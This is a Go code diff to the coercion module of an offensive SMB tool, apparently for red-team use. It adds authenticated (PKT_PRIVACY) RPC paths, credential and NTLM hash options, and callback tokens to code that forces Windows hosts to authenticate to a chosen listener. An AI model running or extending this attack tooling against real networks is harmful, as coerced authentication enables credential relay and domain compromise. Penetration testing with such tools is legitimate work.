@@ -13,6 +13,7 @@ package coerce
 import (
 	"context"
 	"fmt"
+	"strings"
 
 	"github.com/ineffectivecoder/SMBGooser/pkg/dcerpc"
 	"github.com/ineffectivecoder/SMBGooser/pkg/pipe"
@@ -39,9 +40,13 @@ type Coercer interface {
 	// Opnums returns the operation numbers that can trigger coercion
 	Opnums() []OpnumInfo
 
-	// Coerce attempts to trigger authentication to the listener
+	// Coerce attempts to trigger authentication to the listener (unauthenticated RPC)
 	// Returns nil on success, error otherwise
 	Coerce(ctx context.Context, rpc *dcerpc.Client, listener string, opts CoerceOptions) error
+
+	// CoerceAuth attempts to trigger authentication using authenticated RPC (PKT_PRIVACY)
+	// Required for targets that require encrypted RPC
+	CoerceAuth(ctx context.Context, rpc *AuthenticatedClient, listener string, opts CoerceOptions) error
 }
 
 // OpnumInfo describes a coercion-capable operation
@@ -67,6 +72,15 @@ type CoerceOptions struct {
 
 	// Verbose enables detailed output
 	Verbose bool
+
+	// Token is the correlation token for callbacks (if empty, one is generated)
+	Token string
+
+	// Credentials for authenticated RPC (PKT_PRIVACY)
+	Username string
+	Password string
+	Hash     []byte
+	Domain   string
 }
 
 // DefaultCoerceOptions returns default options
@@ -84,6 +98,7 @@ type Result struct {
 	Success  bool
 	Message  string
 	PathUsed string
+	Token    string // Random token for callback correlation (e.g., "spool_abc123")
 }
 
 // CoercionRunner coordinates coercion attacks
@@ -117,9 +132,9 @@ func AllCoercers() []Coercer {
 func (r *CoercionRunner) Run(ctx context.Context, methodName, listener string, opts CoerceOptions) ([]Result, error) {
 	var coercer Coercer
 
-	// Find the requested method
+	// Find the requested method (case-insensitive)
 	for _, c := range r.coercers {
-		if c.Name() == methodName {
+		if strings.EqualFold(c.Name(), methodName) {
 			coercer = c
 			break
 		}
@@ -162,6 +177,11 @@ func (r *CoercionRunner) RunAll(ctx context.Context, listener string, opts Coerc
 
 // runCoercer executes a single coercer
 func (r *CoercionRunner) runCoercer(ctx context.Context, coercer Coercer, listener string, opts CoerceOptions) ([]Result, error) {
+	// If credentials are provided, use authenticated RPC (PKT_PRIVACY)
+	if opts.Username != "" {
+		return r.runCoercerAuth(ctx, coercer, listener, opts)
+	}
+
 	// Open the required pipe
 	p, err := pipe.Open(ctx, r.ipcTree, coercer.PipeName())
 	if err != nil {
@@ -179,6 +199,34 @@ func (r *CoercionRunner) runCoercer(ctx context.Context, coercer Coercer, listen
 
 	// Execute coercion
 	err = coercer.Coerce(ctx, rpc, listener, opts)
+
+	// Build result
+	result := Result{
+		Method:  coercer.Name(),
+		Success: err == nil || isCoercionSuccess(err),
+		Message: formatResultMessage(err),
+	}
+
+	return []Result{result}, err
+}
+
+// runCoercerAuth executes a coercer with PKT_PRIVACY authentication
+func (r *CoercionRunner) runCoercerAuth(ctx context.Context, coercer Coercer, listener string, opts CoerceOptions) ([]Result, error) {
+	// Open the required pipe for RPC
+	p, err := pipe.OpenForRPC(ctx, r.ipcTree, coercer.PipeName())
+	if err != nil {
+		return nil, fmt.Errorf("failed to open pipe %s: %w", coercer.PipeName(), err)
+	}
+	defer p.Close()
+
+	// Create authenticated RPC client
+	authClient, err := NewAuthenticatedClient(p, opts, coercer.InterfaceUUID(), coercer.InterfaceVersion())
+	if err != nil {
+		return nil, fmt.Errorf("authenticated bind failed: %w", err)
+	}
+
+	// Execute coercion using authenticated client
+	err = coercer.CoerceAuth(ctx, authClient, listener, opts)
 
 	// Build result
 	result := Result{
